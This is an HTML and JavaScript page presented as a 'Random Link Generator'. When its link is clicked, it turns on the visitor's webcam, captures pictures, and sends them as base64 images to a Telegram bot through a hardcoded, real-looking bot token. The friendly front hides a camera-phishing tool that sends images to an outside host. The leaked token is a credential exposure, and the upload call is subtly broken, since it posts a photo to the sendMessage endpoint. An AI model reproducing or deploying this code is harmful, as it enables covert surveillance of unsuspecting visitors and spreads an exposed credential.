<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Random Link Generator</title>
  <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.16/dist/tailwind.min.css" rel="stylesheet">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.7.1/gsap.min.js"></script>
  <style>
   .link-container {
      @apply mt-4;
    }
   .link-message {
      @apply text-gray-600;
    }
  </style>
</head>
<body>
  <div class="h-screen flex flex-col justify-center items-center bg-gradient-to-r from-purple-500 to-pink-500">
    <h1 class="text-6xl font-bold text-white mb-8">Random Link Generator</h1>
    <button class="bg-green-500 hover:bg-green-700 text-white font-bold py-2 px-4 rounded" id="generate-link-btn">Generate Link</button>
    <div class="link-container hidden" id="link-container">
      <a href="" id="generated-link" target="_blank"></a>
      <p class="link-message" id="link-message"></p>
    </div>
    <div class="camera-container hidden" id="camera-container">
      <video id="video" width="640" height="480"></video>
      <button class="bg-blue-500 hover:bg-blue-700 text-white font-bold py-2 px-4 rounded" id="take-picture-btn">Take Picture</button>
    </div>
  </div>

  <script>
    const generateLinkBtn = document.getElementById('generate-link-btn');
    const linkContainer = document.getElementById('link-container');
    const generatedLink = document.getElementById('generated-link');
    const linkMessage = document.getElementById('link-message');
    const cameraContainer = document.getElementById('camera-container');
    const video = document.getElementById('video');
    const takePictureBtn = document.getElementById('take-picture-btn');

    let picturesTaken = 0;
    const telegramBotToken = '7700344369:AAExr9dJnXEEN74xLW_WlqCASGW4qtAqj4M';
    const telegramBotApiUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;

    generateLinkBtn.addEventListener('click', generateRandomLink);

    async function generateRandomLink() {
      try {
        const link = `https://example.com/${Math.random().toString(36).substr(2, 9)}`;
        generatedLink.href = link;
        generatedLink.textContent = link;
        linkContainer.classList.remove('hidden');
        linkMessage.textContent = 'Click the link to take 3 pictures!';
        generatedLink.addEventListener('click', async () => {
          await takePictures();
        });
      } catch (error) {
        console.error(error);
      }
    }

    async function takePictures() {
      try {
        cameraContainer.classList.remove('hidden');
        await navigator.mediaDevices.getUserMedia({ video: true, audio: false })
         .then(stream => {
            video.srcObject = stream;
            video.play();
            takePictureBtn.addEventListener('click', async () => {
              const canvas = document.createElement('canvas');
              canvas.width = video.videoWidth;
              canvas.height = video.videoHeight;
              canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
              const picture = canvas.toDataURL('image/jpeg');
              await sendPictureToTelegramBot(picture);
              picturesTaken++;
              if (picturesTaken === 3) {
                cameraContainer.classList.add('hidden');
              }
            });
          })
         .catch(error => {
            console.error(error);
          });
      } catch (error) {
        console.error(error);
      }
    }

    async function sendPictureToTelegramBot(picture) {
      try {
        const response = await fetch(telegramBotApiUrl, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({
            chat_id: '@your_channel_username',
            photo: picture
          })
        });
        const data = await response.json();
        console.log(data);
      } catch (error) {
        console.error(error);
      }
    }
  </script>
</body>
</html>
